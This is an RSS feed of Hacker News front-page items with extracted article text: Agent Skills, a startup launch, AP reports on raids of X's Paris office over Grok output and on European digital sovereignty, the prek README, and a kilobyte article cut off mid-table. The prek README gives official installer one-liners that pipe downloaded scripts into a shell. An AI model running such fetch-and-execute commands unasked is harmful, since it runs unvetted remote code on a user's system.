<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 03 Feb 2026 23:48:02 +0000</lastBuildDate><item><title>Agent Skills</title><link>https://agentskills.io/home</link><description>&lt;doc fingerprint="8f77afff0b4fb448"&gt;
  &lt;main&gt;&lt;head rend="h2"&gt;Why Agent Skills?&lt;/head&gt;Agents are increasingly capable, but often don’t have the context they need to do real work reliably. Skills solve this by giving agents access to procedural knowledge and company-, team-, and user-specific context they can load on demand. Agents with access to a set of skills can extend their capabilities based on the task they’re working on. For skill authors: Build capabilities once and deploy them across multiple agent products. For compatible agents: Support for skills lets end users give agents new capabilities out of the box. For teams and enterprises: Capture organizational knowledge in portable, version-controlled packages.&lt;head rend="h2"&gt;What can Agent Skills enable?&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;Domain expertise: Package specialized knowledge into reusable instructions, from legal review processes to data analysis pipelines.&lt;/item&gt;&lt;item&gt;New capabilities: Give agents new capabilities (e.g. creating presentations, building MCP servers, analyzing datasets).&lt;/item&gt;&lt;item&gt;Repeatable workflows: Turn multi-step tasks into consistent and auditable workflows.&lt;/item&gt;&lt;item&gt;Interoperability: Reuse the same skill across different skills-compatible agent products.&lt;/item&gt;&lt;/list&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46871173</guid><pubDate>Tue, 03 Feb 2026 14:09:54 +0000</pubDate></item><item><title>New York’s budget bill would require “blocking technology” on all 3D printers</title><link>https://blog.adafruit.com/2026/02/03/new-york-wants-to-ctrlaltdelete-your-3d-printer/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46872540</guid><pubDate>Tue, 03 Feb 2026 15:51:42 +0000</pubDate></item><item><title>Qwen3-Coder-Next</title><link>https://qwen.ai/blog?id=qwen3-coder-next</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46872706</guid><pubDate>Tue, 03 Feb 2026 16:01:50 +0000</pubDate></item><item><title>Launch HN: Modelence (YC S25) – App Builder with TypeScript / MongoDB Framework</title><link>https://news.ycombinator.com/item?id=46872733</link><description>&lt;doc fingerprint="bb22d77b01df145e"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi all, Aram and Eduard here - co-founders of Modelence (&lt;/p&gt;https://modelence.com&lt;p&gt;). After spending years on scaling our previous startup’s platform, we built an open-source full-stack TypeScript + MongoDB framework to stop solving the same auth / database / API / cron job implementations every time we created an app, and we didn’t like the idea of using multiple managed platforms for each of these to run our apps either.&lt;/p&gt;&lt;p&gt;(Here’s our prior Show HN post for reference: https://news.ycombinator.com/item?id=44902227)&lt;/p&gt;&lt;p&gt;At the same time, we were excited by the whole AI app builder boom and realized that the real challenge there is the platform rather than the tool itself. Now we’re making Modelence the first full-stack framework that’s built for coding agents and humans alike:&lt;/p&gt;&lt;p&gt;- TypeScript is already great for AI coding because it provides guardrails and catches many errors at build time, so agents can auto-correct&lt;/p&gt;&lt;p&gt;- MongoDB eliminates the schema management problem for agents, which is where they fail the most often otherwise (+ works great with TS/Node.js)&lt;/p&gt;&lt;p&gt;- Built-in auth, database, cron jobs and else that just works together out of the box means agents only focus on your product logic and don’t fail at trying to set these things up (+ less tokens spent on boilerplate).&lt;/p&gt;&lt;p&gt;You can now try the Modelence app builder (based on Claude Agent SDK) by just typing a prompt on our landing page ( https://modelence.com ) - watch a demo video here: https://youtu.be/BPsYvj_nGuE&lt;/p&gt;&lt;p&gt;Then you can check it out locally and continue working in your own IDE, while still using Modelence Cloud as your backend, with a dev cloud environment, and later deploy and run on Modelence Cloud with built-in observability around every operation running in your app.&lt;/p&gt;&lt;p&gt;We’re also going to add a built-in DevOps agent that lives in the same cloud, knows the framework end-to-end, and will use all this observability data to act on errors, alerts, and incidents - closing the loop, because running in production is much harder than just building.&lt;/p&gt;&lt;p&gt;We launched the app builder as a quick start for developers, to demonstrate the framework and Modelence Cloud without having to manually read docs and follow the steps to set up a new app. Our main focus is still the platform itself, since we believe the real challenge in AI coding is the framework and the platform rather than the builder tool itself.&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46872733</guid><pubDate>Tue, 03 Feb 2026 16:03:21 +0000</pubDate></item><item><title>X offices raided in France</title><link>https://apnews.com/article/france-x-investigation-seach-elon-musk-1116be84d84201011219086ecfd4e0bc</link><description>&lt;doc fingerprint="cb949b2d010d9584"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;X offices raided in France as prosecutors investigate child abuse images and deepfakes&lt;/head&gt;
    &lt;head rend="h2"&gt;X offices raided in France as prosecutors investigate child abuse images and deepfakes&lt;/head&gt;
    &lt;p&gt;PARIS (AP) — French prosecutors raided the offices of social media platform X on Tuesday as part of a preliminary investigation into allegations that include spreading child sexual abuse images and deepfakes. They have also summoned billionaire owner Elon Musk for questioning.&lt;/p&gt;
    &lt;p&gt;X and Musk’s artificial intelligence company xAI also face intensifying scrutiny from Britain’s data privacy regulator, which opened formal investigations into how they handled personal data when they developed and deployed Musk’s artificial intelligence chatbot Grok.&lt;/p&gt;
    &lt;p&gt;Grok, which was built by xAI and is available through X, sparked global outrage last month after it pumped out a torrent of sexualized nonconsensual deepfake images in response to requests from X users.&lt;/p&gt;
    &lt;p&gt;The French investigation was opened in January last year by the prosecutors’ cybercrime unit, the Paris prosecutors’ office said in a statement. It’s looking into alleged “complicity” in possessing and spreading pornographic images of minors, sexually explicit deepfakes, denial of crimes against humanity and manipulation of an automated data processing system as part of an organized group, among other charges.&lt;/p&gt;
    &lt;p&gt;Prosecutors asked Musk and former CEO Linda Yaccarino to attend “voluntary interviews” on April 20. Employees of X have also been summoned that same week to be heard as witnesses, the statement said. Yaccarino was CEO from May 2023 until July 2025.&lt;/p&gt;
    &lt;p&gt;In a post on its own service denying the allegations, X railed against the raid on its Paris office as “an abusive act of law enforcement theater designed to achieve illegitimate political objectives rather than advance legitimate law enforcement goals rooted in the fair and impartial administration of justice.”&lt;/p&gt;
    &lt;p&gt;In a message posted on X, the Paris prosecutors’ office announced the ongoing searches at the company’s offices in France and said it was leaving the platform while calling on followers to join it on other social media.&lt;/p&gt;
    &lt;p&gt;“At this stage, the conduct of the investigation is based on a constructive approach, with the aim of ultimately ensuring that the X platform complies with French law, as it operates on the national territory,” the prosecutors’ statement said.&lt;/p&gt;
    &lt;p&gt;European Union police agency Europol “is supporting the French authorities in this,” Europol spokesperson Jan Op Gen Oorth told the AP, without elaborating.&lt;/p&gt;
    &lt;p&gt;French authorities opened their investigation after reports from a French lawmaker alleging that biased algorithms on X likely distorted the functioning of an automated data processing system.&lt;/p&gt;
    &lt;p&gt;It expanded after Grok generated posts that allegedly denied the Holocaust, a crime in France, and spread sexually explicit deepfakes, the statement said.&lt;/p&gt;
    &lt;p&gt;Grok wrote in a widely shared post in French that gas chambers at the Auschwitz-Birkenau death camp were designed for “disinfection with Zyklon B against typhus” rather than for mass murder — language long associated with Holocaust denial.&lt;/p&gt;
    &lt;p&gt;In later posts on X, the chatbot reversed itself and acknowledged that its earlier reply was wrong, saying it had been deleted and pointed to historical evidence that Zyklon B was used to kill more than 1 million people in Auschwitz gas chambers.&lt;/p&gt;
    &lt;p&gt;The chatbot also appeared to praise Adolf Hitler last year, in comments that X took down after complaints.&lt;/p&gt;
    &lt;p&gt;In Britain, the Information Commissioner’s Office said it’s looking into whether X and xAI followed the law when processing personal data and whether Grok had any measures in place to prevent its use to generate “harmful manipulated images.”&lt;/p&gt;
    &lt;p&gt;“The reports about Grok raise deeply troubling questions about how people’s personal data has been used to generate intimate or sexualised images without their knowledge or consent, and whether the necessary safeguards were put in place to prevent this,” said William Malcolm, an executive director at the watchdog.&lt;/p&gt;
    &lt;p&gt;He didn’t specify what the penalty would be if the probe found the companies didn’t comply with data protection laws.&lt;/p&gt;
    &lt;p&gt;A separate investigation into Grok launched last month by the U.K. media regulator, Ofcom, is ongoing.&lt;/p&gt;
    &lt;p&gt;Ofcom said Tuesday it’s still gathering evidence and warned the probe could take months.&lt;/p&gt;
    &lt;p&gt;X has also been under pressure from the EU. The 27-nation bloc’s executive arm opened an investigation last month after Grok spewed nonconsensual sexualized deepfake images on the platform.&lt;/p&gt;
    &lt;p&gt;Brussels has already hit X with a 120-million euro (then-$140 million) fine for shortcomings under the bloc’s sweeping digital regulations, including blue checkmarks that broke the rules on “deceptive design practices” that risked exposing users to scams and manipulation.&lt;/p&gt;
    &lt;p&gt;On Monday, Musk ’s space exploration and rocket business, SpaceX, announced that it acquired xAI in a deal that will also combine Grok, X and his satellite communication company Starlink.&lt;/p&gt;
    &lt;p&gt;___&lt;/p&gt;
    &lt;p&gt;Associated Press writers Nicolas Vaux-Montagny in Lyon, France, Mike Corder in The Hague, Netherlands, Sylvia Hui and Kelvin Chan in London contributed to this report.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46872894</guid><pubDate>Tue, 03 Feb 2026 16:14:17 +0000</pubDate></item><item><title>Prek: A better, faster, drop-in pre-commit replacement, engineered in Rust</title><link>https://github.com/j178/prek</link><description>&lt;doc fingerprint="28df57ddde9b6d0"&gt;
  &lt;main&gt;
    &lt;p&gt;pre-commit is a framework to run hooks written in many languages, and it manages the language toolchain and dependencies for running the hooks.&lt;/p&gt;
    &lt;p&gt;prek is a reimagined version of pre-commit, built in Rust. It is designed to be a faster, dependency-free and drop-in alternative for it, while also providing some additional long-requested features.&lt;/p&gt;
    &lt;p&gt;Note&lt;/p&gt;
    &lt;p&gt;Although prek is pretty new, it’s already powering real‑world projects like CPython, Apache Airflow, FastAPI, and more projects are picking it up—see Who is using prek?. If you’re looking for an alternative to &lt;code&gt;pre-commit&lt;/code&gt;, please give it a try—we’d love your feedback!&lt;/p&gt;
    &lt;p&gt;Please note that some languages are not yet supported for full drop‑in parity with &lt;code&gt;pre-commit&lt;/code&gt;. See Language Support for current status.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;🚀 A single binary with no dependencies, does not require Python or any other runtime.&lt;/item&gt;
      &lt;item&gt;⚡ Faster than &lt;code&gt;pre-commit&lt;/code&gt;and more efficient in disk space usage.&lt;/item&gt;
      &lt;item&gt;🔄 Fully compatible with the original pre-commit configurations and hooks.&lt;/item&gt;
      &lt;item&gt;🏗️ Built-in support for monorepos (i.e. workspace mode).&lt;/item&gt;
      &lt;item&gt;🐍 Integration with &lt;code&gt;uv&lt;/code&gt;for managing Python virtual environments and dependencies.&lt;/item&gt;
      &lt;item&gt;🛠️ Improved toolchain installations for Python, Node.js, Bun, Go, Rust and Ruby, shared between hooks.&lt;/item&gt;
      &lt;item&gt;📦 Built-in Rust-native implementation of some common hooks.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head&gt;Standalone installer&lt;/head&gt;
    &lt;p&gt;prek provides a standalone installer script to download and install the tool,&lt;/p&gt;
    &lt;p&gt;On Linux and macOS:&lt;/p&gt;
    &lt;code&gt;curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.sh | sh&lt;/code&gt;
    &lt;p&gt;On Windows:&lt;/p&gt;
    &lt;code&gt;powershell -ExecutionPolicy ByPass -c "irm https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.ps1 | iex"&lt;/code&gt;
    &lt;head&gt;PyPI&lt;/head&gt;
    &lt;p&gt;prek is published as Python binary wheel to PyPI, you can install it using &lt;code&gt;pip&lt;/code&gt;, &lt;code&gt;uv&lt;/code&gt; (recommended), or &lt;code&gt;pipx&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;# Using uv (recommended)
uv tool install prek

# Using uvx (install and run in one command)
uvx prek

# Adding prek to the project dev-dependencies
uv add --dev prek

# Using pip
pip install prek

# Using pipx
pipx install prek&lt;/code&gt;
    &lt;head&gt;Homebrew&lt;/head&gt;
    &lt;code&gt;brew install prek&lt;/code&gt;
    &lt;head&gt;Cargo&lt;/head&gt;
    &lt;p&gt;Build from source using Cargo (Rust 1.89+ is required):&lt;/p&gt;
    &lt;code&gt;cargo install --locked prek&lt;/code&gt;
    &lt;head&gt;npmjs&lt;/head&gt;
    &lt;p&gt;prek is published as a Node.js package and can be installed with any npm-compatible package manager:&lt;/p&gt;
    &lt;code&gt;# As a dev dependency
npm add -D @j178/prek
pnpm add -D @j178/prek
bun add -D @j178/prek

# Or install globally
npm install -g @j178/prek
pnpm add -g @j178/prek
bun install -g @j178/prek

# Or run directly without installing
npx @j178/prek --version
bunx @j178/prek --version&lt;/code&gt;
    &lt;head&gt;Nix&lt;/head&gt;
    &lt;p&gt;prek is available via Nixpkgs.&lt;/p&gt;
    &lt;code&gt;# Choose what's appropriate for your use case.
# One-off in a shell:
nix-shell -p prek

# NixOS or non-NixOS without flakes:
nix-env -iA nixos.prek

# Non-NixOS with flakes:
nix profile install nixpkgs#prek&lt;/code&gt;
    &lt;head&gt;GitHub Releases&lt;/head&gt;
    &lt;p&gt;Pre-built binaries are available for download from the GitHub releases page.&lt;/p&gt;
    &lt;head&gt;GitHub Actions&lt;/head&gt;
    &lt;p&gt;prek can be used in GitHub Actions via the j178/prek-action repository.&lt;/p&gt;
    &lt;p&gt;Example workflow:&lt;/p&gt;
    &lt;code&gt;name: Prek checks
on: [push, pull_request]

jobs:
  prek:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: j178/prek-action@v1&lt;/code&gt;
    &lt;p&gt;This action installs prek and runs &lt;code&gt;prek run --all-files&lt;/code&gt; on your repository.&lt;/p&gt;
    &lt;p&gt;prek is also available via &lt;code&gt;taiki-e/install-action&lt;/code&gt; for installing various tools.&lt;/p&gt;
    &lt;p&gt;If installed via the standalone installer, prek can update itself to the latest version:&lt;/p&gt;
    &lt;code&gt;prek self update&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I already use pre-commit: follow the short migration checklist in the quickstart guide to swap in &lt;code&gt;prek&lt;/code&gt;safely.&lt;/item&gt;
      &lt;item&gt;I'm new to pre-commit-style tools: learn the basics—creating a config, running hooks, and installing git hooks—in the beginner quickstart walkthrough.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;It is multiple times faster than &lt;code&gt;pre-commit&lt;/code&gt;and takes up half the disk space.&lt;/item&gt;
      &lt;item&gt;It redesigned how hook environments and toolchains are managed, they are all shared between hooks, which reduces the disk space usage and speeds up the installation process.&lt;/item&gt;
      &lt;item&gt;Repositories are cloned in parallel, and hooks are installed in parallel if their dependencies are disjoint.&lt;/item&gt;
      &lt;item&gt;Hooks can run in parallel by priority (hooks with the same &lt;code&gt;priority&lt;/code&gt;may run concurrently), reducing end-to-end runtime.&lt;/item&gt;
      &lt;item&gt;It uses &lt;code&gt;uv&lt;/code&gt;for creating Python virtualenvs and installing dependencies, which is known for its speed and efficiency.&lt;/item&gt;
      &lt;item&gt;It implements some common hooks in Rust, built in prek, which are faster than their Python counterparts.&lt;/item&gt;
      &lt;item&gt;It supports &lt;code&gt;repo: builtin&lt;/code&gt;for offline, zero-setup hooks, which is not available in&lt;code&gt;pre-commit&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No need to install Python or any other runtime, just download a single binary.&lt;/item&gt;
      &lt;item&gt;No hassle with your Python version or virtual environments, prek automatically installs the required Python version and creates a virtual environment for you.&lt;/item&gt;
      &lt;item&gt;Built-in support for workspaces (or monorepos), each subproject can have its own &lt;code&gt;.pre-commit-config.yaml&lt;/code&gt;file.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;prek run&lt;/code&gt;has some nifty improvements over&lt;code&gt;pre-commit run&lt;/code&gt;, such as:&lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;prek run --directory &amp;lt;dir&amp;gt;&lt;/code&gt;runs hooks for files in the specified directory, no need to use&lt;code&gt;git ls-files -- &amp;lt;dir&amp;gt; | xargs pre-commit run --files&lt;/code&gt;anymore.&lt;/item&gt;&lt;item&gt;&lt;code&gt;prek run --last-commit&lt;/code&gt;runs hooks for files changed in the last commit.&lt;/item&gt;&lt;item&gt;&lt;code&gt;prek run [HOOK] [HOOK]&lt;/code&gt;selects and runs multiple hooks.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;prek list&lt;/code&gt;command lists all available hooks, their ids, and descriptions, providing a better overview of the configured hooks.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;prek auto-update&lt;/code&gt;supports&lt;code&gt;--cooldown-days&lt;/code&gt;to mitigate open source supply chain attacks.&lt;/item&gt;
      &lt;item&gt;prek provides shell completions for &lt;code&gt;prek run &amp;lt;hook_id&amp;gt;&lt;/code&gt;command, making it easier to run specific hooks without remembering their ids.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For more detailed improvements prek offers, take a look at Difference from pre-commit.&lt;/p&gt;
    &lt;p&gt;prek is pretty new, but it is already being used or recommend by some projects and organizations:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;apache/airflow&lt;/item&gt;
      &lt;item&gt;python/cpython&lt;/item&gt;
      &lt;item&gt;pdm-project/pdm&lt;/item&gt;
      &lt;item&gt;fastapi/fastapi&lt;/item&gt;
      &lt;item&gt;fastapi/typer&lt;/item&gt;
      &lt;item&gt;fastapi/asyncer&lt;/item&gt;
      &lt;item&gt;astral-sh/ruff&lt;/item&gt;
      &lt;item&gt;astral-sh/ty&lt;/item&gt;
      &lt;item&gt;openclaw/openclaw&lt;/item&gt;
      &lt;item&gt;home-assistant/core&lt;/item&gt;
      &lt;item&gt;DetachHead/basedpyright&lt;/item&gt;
      &lt;item&gt;OpenLineage/OpenLineage&lt;/item&gt;
      &lt;item&gt;authlib/authlib&lt;/item&gt;
      &lt;item&gt;django/djangoproject.com&lt;/item&gt;
      &lt;item&gt;Future-House/paper-qa&lt;/item&gt;
      &lt;item&gt;requests-cache/requests-cache&lt;/item&gt;
      &lt;item&gt;Goldziher/kreuzberg&lt;/item&gt;
      &lt;item&gt;python-attrs/attrs&lt;/item&gt;
      &lt;item&gt;jlowin/fastmcp&lt;/item&gt;
      &lt;item&gt;apache/iceberg-python&lt;/item&gt;
      &lt;item&gt;apache/lucene&lt;/item&gt;
      &lt;item&gt;jcrist/msgspec&lt;/item&gt;
      &lt;item&gt;python-humanize/humanize&lt;/item&gt;
      &lt;item&gt;MoonshotAI/kimi-cli&lt;/item&gt;
      &lt;item&gt;simple-icons/simple-icons&lt;/item&gt;
      &lt;item&gt;ast-grep/ast-grep&lt;/item&gt;
      &lt;item&gt;commitizen-tools/commitizen&lt;/item&gt;
      &lt;item&gt;cocoindex-io/cocoindex&lt;/item&gt;
      &lt;item&gt;cachix/devenv&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This project is heavily inspired by the original pre-commit tool, and it wouldn't be possible without the hard work of the maintainers and contributors of that project.&lt;/p&gt;
    &lt;p&gt;And a special thanks to the Astral team for their remarkable projects, particularly uv, from which I've learned a lot on how to write efficient and idiomatic Rust code.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873138</guid><pubDate>Tue, 03 Feb 2026 16:29:34 +0000</pubDate></item><item><title>France dumps Zoom and Teams as Europe seeks digital autonomy from the US</title><link>https://apnews.com/article/europe-digital-sovereignty-big-tech-9f5388b68a0648514cebc8d92f682060</link><description>&lt;doc fingerprint="af50b110b70b4885"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;France dumps Zoom and Teams as Europe seeks digital autonomy from the US&lt;/head&gt;
    &lt;head rend="h2"&gt;France dumps Zoom and Teams as Europe seeks digital autonomy from the US&lt;/head&gt;
    &lt;p&gt;LONDON (AP) — In France, civil servants will ditch Zoom and Teams for a homegrown video conference system. Soldiers in Austria are using open source office software to write reports after the military dropped Microsoft Office. Bureaucrats in a German state have also turned to free software for their administrative work.&lt;/p&gt;
    &lt;p&gt;Around Europe, governments and institutions are seeking to reduce their use of digital services from U.S. Big Tech companies and turning to domestic or free alternatives. The push for “digital sovereignty” is gaining attention as the Trump administration strikes an increasingly belligerent posture toward the continent, highlighted by recent tensions over Greenland that intensified fears that Silicon Valley giants could be compelled to cut off access.&lt;/p&gt;
    &lt;p&gt;Concerns about data privacy and worries that Europe is not doing enough to keep up with the United States and Chinese tech leadership are also fueling the drive.&lt;/p&gt;
    &lt;p&gt;The French government referenced some of these concerns when it announced last week that 2.5 million civil servants would stop using video conference tools from U.S. providers — including Zoom, Microsoft Teams, Webex and GoTo Meeting — by 2027 and switch to Visio, a homegrown service.&lt;/p&gt;
    &lt;p&gt;The objective is “to put an end to the use of non-European solutions, to guarantee the security and confidentiality of public electronic communications by relying on a powerful and sovereign tool,” the announcement said.&lt;/p&gt;
    &lt;p&gt;“We cannot risk having our scientific exchanges, our sensitive data, and our strategic innovations exposed to non-European actors,” David Amiel, a civil service minister, said in a press release.&lt;/p&gt;
    &lt;p&gt;Microsoft said it continues to “partner closely with the government in France and respect the importance of security, privacy, and digital trust for public institutions.”&lt;/p&gt;
    &lt;p&gt;The company said it is “focused on providing customers with greater choice, stronger data protection, and resilient cloud services — ensuring data stays in Europe, under European law, with robust security and privacy protections.”&lt;/p&gt;
    &lt;p&gt;Zoom, Webex and GoTo Meeting did not respond to requests for comment.&lt;/p&gt;
    &lt;p&gt;French President Emmanuel Macron has been pushing digital sovereignty for years. But there’s now a lot more “political momentum behind this idea now that we need to de-risk from U.S. tech,” Nick Reiners, senior geotechnology analyst at the Eurasia Group.&lt;/p&gt;
    &lt;p&gt;“It feels kind of like there’s a real zeitgeist shift,” Reiners said&lt;/p&gt;
    &lt;p&gt;It was a hot topic at the World Economic Forum’s annual meeting of global political and business elites last month in Davos, Switzerland. The European Commission’s official for tech sovereignty, Henna Virkkunen, told an audience that Europe’s reliance on others “can be weaponized against us.”&lt;/p&gt;
    &lt;p&gt;“That’s why it’s so important that we are not dependent on one country or one company when it comes to very critical fields of our economy or society,” she said, without naming countries or companies.&lt;/p&gt;
    &lt;p&gt;A decisive moment came last year when the Trump administration sanctioned the International Criminal Court’s top prosecutor after the tribunal, based in The Hague, Netherlands, issued an arrest warrant for Israeli Prime Minister Benjamin Netanyahu, an ally of President Donald Trump.&lt;/p&gt;
    &lt;p&gt;The sanctions led Microsoft to cancel Khan’s ICC email, a move that was first reported by The Associated Press and sparked fears of a “kill switch” that Big Tech companies can use to turn off service at will.&lt;/p&gt;
    &lt;p&gt;Microsoft maintains it kept in touch with the ICC “throughout the process that resulted in the disconnection of its sanctioned official from Microsoft services. At no point did Microsoft cease or suspend its services to the ICC.”&lt;/p&gt;
    &lt;p&gt;Microsoft President Brad Smith has repeatedly sought to strengthen trans-Atlantic ties, the company’s press office said, and pointed to an interview he did last month with CNN in Davos in which he said that jobs, trade and investment. as well as security, would be affected by a rift over Greenland.&lt;/p&gt;
    &lt;p&gt;“Europe is the American tech sector’s biggest market after the United States itself. It all depends on trust. Trust requires dialogue,” Smith said.&lt;/p&gt;
    &lt;p&gt;Other incidents have added to the movement. There’s a growing sense that repeated EU efforts to rein in tech giants such as Google with blockbuster antitrust fines and sweeping digital rule books haven’t done much to curb their dominance.&lt;/p&gt;
    &lt;p&gt;Billionaire Elon Musk is also a factor. Officials worry about relying on his Starlink satellite internet system for communications in Ukraine.&lt;/p&gt;
    &lt;p&gt;Washington and Brussels wrangled for years over data transfer agreements, triggered by former National Security Agency contractor Edward Snowden’s revelations of U.S. cyber-snooping.&lt;/p&gt;
    &lt;p&gt;With online services now mainly hosted in the cloud through data centers, Europeans fear that their data is vulnerable.&lt;/p&gt;
    &lt;p&gt;U.S. cloud providers have responded by setting up so-called “sovereign cloud” operations, with data centers located in European countries, owned by European entities and with physical and remote access only for staff who are European Union residents.&lt;/p&gt;
    &lt;p&gt;The idea is that “only Europeans can take decisions so that they can’t be coerced by the U.S.,” Reiners said.&lt;/p&gt;
    &lt;p&gt;The German state of Schleswig-Holstein last year migrated 44,000 employee inboxes from Microsoft to an open source email program. It also switched from Microsoft’s SharePoint file sharing system to Nextcloud, an open source platform, and is even considering replacing Windows with Linux and telephones and videoconferencing with open source systems.&lt;/p&gt;
    &lt;p&gt;“We want to become independent of large tech companies and ensure digital sovereignty,” Digitalization Minister Dirk Schrödter said in an October announcement.&lt;/p&gt;
    &lt;p&gt;The French city of Lyon said last year that it’s deploying free office software to replace Microsoft. Denmark’s government and the cities of Copenhagen and Aarhus have also been trying out open-source software.&lt;/p&gt;
    &lt;p&gt;“We must never make ourselves so dependent on so few that we can no longer act freely,” Digital Minister Caroline Stage Olsen wrote on LinkedIn last year. “Too much public digital infrastructure is currently tied up with very few foreign suppliers.”&lt;/p&gt;
    &lt;p&gt;The Austrian military said it has also switched to LibreOffice, a software package with word processor, spreadsheet and presentation programs that mirrors Microsoft 365’s Word, Excel and PowerPoint.&lt;/p&gt;
    &lt;p&gt;The Document Foundation, a nonprofit based in Germany that’s behind LibreOffice, said the military’s switch “reflects a growing demand for independence from single vendors.” Reports also said the military was concerned that Microsoft was moving file storage online to the cloud — the standard version of LibreOffice is not cloud-based.&lt;/p&gt;
    &lt;p&gt;Some Italian cities and regions adopted the software years ago, said Italo Vignoli, a spokesman for The Document Foundation. Back then, the appeal was not needing to pay for software licenses. Now, it’s the main reason is to avoid being locked into a proprietary system.&lt;/p&gt;
    &lt;p&gt;“At first, it was: we will save money and by the way, we will get freedom,” Vignoli said. “Today it is: we will be free and by the way, we will also save some money.”&lt;/p&gt;
    &lt;p&gt;___&lt;/p&gt;
    &lt;p&gt;Associated Press writer Molly Quell in The Hague, Netherlands contributed to this report.&lt;/p&gt;
    &lt;p&gt;___&lt;/p&gt;
    &lt;p&gt;This version corrects the contribution line to Molly Quell instead of Molly Hague.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873294</guid><pubDate>Tue, 03 Feb 2026 16:39:18 +0000</pubDate></item><item><title>1 kilobyte is precisely 1000 bytes?</title><link>https://waspdev.com/articles/2026-01-11/kilobyte-is-1000-bytes</link><description>&lt;doc fingerprint="3b2134c2f49f1add"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;1 kilobyte is precisely 1000 bytes&lt;/head&gt;
    &lt;p&gt; Published on &lt;lb/&gt;Updated on &lt;/p&gt;
    &lt;p&gt;When it comes to computer memory, we usually learn that a kilobyte is 1024 bytes, a megabyte is 1024 kilobytes, and so on. But what if I told you that it's not necessarily true and 1 kilobyte can be 1000 bytes? And what's more, this makes even more sense.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why do we often say 1 kilobyte = 1024 bytes?&lt;/head&gt;
    &lt;p&gt;Since computers work in a binary system (base 2), the memory is also addressed in binary. This means it's quite impractical to use memory addresses or produce RAM sticks with memory amounts that are not multiples of powers of 2. From the powers of 2 we chose 1024 (210) as the base order of magnitude, since it's very close to 1000 (2.4% difference) and it's not insanely large. So, in practice we often consider kilo as 1024 (210), mega as 1048576 (220), giga as 1073741824 (230), etc.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why does 1000 still make more sense?&lt;/head&gt;
    &lt;p&gt;While binary kilo, mega and giga units are close to their decimal counterparts, some might already notice that the larger are the units, the more is the proportional inaccuracy. In order to illustrate, let's increase the units:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Unit&lt;/cell&gt;
        &lt;cell role="head"&gt;Decimal value&lt;/cell&gt;
        &lt;cell role="head"&gt;Binary value&lt;/cell&gt;
        &lt;cell role="head"&gt;Relative difference&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Kilo&lt;/cell&gt;
        &lt;cell&gt;1000&lt;/cell&gt;
        &lt;cell&gt;1024&lt;/cell&gt;
        &lt;cell&gt;2.4%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Mega&lt;/cell&gt;
        &lt;cell&gt;1000000&lt;/cell&gt;
        &lt;cell&gt;1048576&lt;/cell&gt;
        &lt;cell&gt;≈ 4.8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Giga&lt;/cell&gt;
        &lt;cell&gt;1000000000&lt;/cell&gt;
        &lt;cell&gt;1073741824&lt;/cell&gt;
        &lt;cell&gt;≈ 7.3%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Tera&lt;/cell&gt;
        &lt;cell&gt;1000000000000&lt;/cell&gt;
        &lt;cell&gt;1099511627776&lt;/cell&gt;
        &lt;cell&gt;≈ 10%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Peta&lt;/cell&gt;
        &lt;cell&gt;1015&lt;/cell&gt;
        &lt;cell&gt;~ 1.126 * 1015&lt;/cell&gt;
